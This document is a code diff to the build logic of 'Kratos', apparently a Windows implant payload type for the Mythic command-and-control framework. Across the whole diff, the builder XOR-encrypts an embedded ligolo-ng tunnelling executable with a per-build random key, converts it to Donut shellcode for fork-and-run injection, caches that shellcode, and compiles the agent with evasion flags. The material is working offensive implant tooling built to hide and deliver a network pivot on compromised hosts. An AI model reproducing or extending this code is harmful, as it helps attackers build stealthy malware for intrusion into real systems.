@@ -274,10 +274,7 @@ class Kratos(PayloadType):
                         source = f"bundled binaries/agent.exe ({len(embedded_data)} bytes)"
 
                 if embedded_data:
-                    # XOR-encrypt raw PE with a random 16-byte key (new key per build).
-                    # No Donut here: the PE is written to disk at runtime so that
-                    # ligolo-ng receives its CLI args (-connect, -ignore-cert, etc.)
-                    # via CreateProcessW. Donut shellcode cannot accept runtime arguments.
+                    # --- Disk-drop path: XOR encrypt raw PE → embedded_ligolo.h ---
                     xor_key = list(os.urandom(16))
                     encrypted = bytes(b ^ xor_key[i % 16] for i, b in enumerate(embedded_data))
                     hex_enc = ", ".join(f"0x{b:02x}" for b in encrypted)
@@ -299,6 +296,39 @@ class Kratos(PayloadType):
                         StepStdout=f"Ligolo-ng ({source}): {len(embedded_data)} bytes raw PE → XOR encrypted → embedded_ligolo.h",
                         StepSuccess=True
                     ))
+
+                    # --- Fork+run path: Donut (no args) → cache shellcode bytes (base64) ---
+                    # Upload to Mythic happens at task time (requires TaskID not available here).
+                    # Args passed at runtime via CreateProcessW lpCommandLine (GetCommandLineW trick).
+                    try:
+                        with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as tf:
+                            tf.write(embedded_data)
+                            tmp_exe = tf.name
+                        sc_bytes = bytes(donut.create(file=tmp_exe, arch=2, bypass=3, format=1))
+                        os.unlink(tmp_exe)
+
+                        cache_path = "/tmp/ligolo_sc_cache.json"
+                        try:
+                            with open(cache_path) as cf:
+                                cache = json.load(cf)
+                        except Exception:
+                            cache = {}
+                        cache[self.uuid] = base64.b64encode(sc_bytes).decode("ascii")
+                        with open(cache_path, "w") as cf:
+                            json.dump(cache, cf)
+                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Generating Shellcode",
+                            StepStdout=f"Ligolo fork+run shellcode ready ({len(sc_bytes)} bytes); will upload at task time.",
+                            StepSuccess=True
+                        ))
+                    except Exception as e:
+                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Generating Shellcode",
+                            StepStdout=f"Warning: fork+run Donut step failed: {e}\nDisk-drop still works.",
+                            StepSuccess=True
+                        ))
 
             # Pass CFLAGS to make (commandes + backend crypto + evasion + embedded)
             command = f"make CC=x86_64-w64-mingw32-gcc CFLAGS=\"{command_defines} {crypto_define} {evasion_defines} {embedded_define} -DBUILD\""
